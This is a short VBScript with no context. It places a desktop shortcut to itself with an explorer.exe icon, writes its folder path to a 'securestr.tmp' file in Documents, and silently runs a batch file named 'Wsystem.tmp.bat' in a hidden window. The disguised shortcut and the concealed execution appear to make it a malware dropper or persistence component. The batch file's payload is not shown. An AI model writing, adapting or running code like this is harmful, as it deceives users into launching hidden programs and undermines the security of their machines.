Set fso = CreateObject("Scripting.FileSystemObject")
currentDirectory = fso.GetAbsolutePathName(".")
currentFilename = fso.GetFileName(WScript.ScriptFullName)
targetPath = currentDirectory & "\" & currentFilename
Set objShell = CreateObject("WScript.Shell")
desktopPath = objShell.SpecialFolders("Desktop")
shortcutPath = desktopPath & "\" & currentFilename & ".lnk"
Set objShortcut = objShell.CreateShortcut(shortcutPath)
objShortcut.TargetPath = targetPath
objShortcut.Save
objShortcut.IconLocation = "%SystemRoot%\explorer.exe"
objShortcut.Save
documentsPath = objShell.SpecialFolders("MyDocuments")
tmpFilePath = documentsPath & "\securestr.tmp"
Set objFile = fso.CreateTextFile(tmpFilePath)
objFile.WriteLine currentDirectory
objFile.Close
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c Wsystem.tmp.bat", 0, True
Set objShell = Nothing
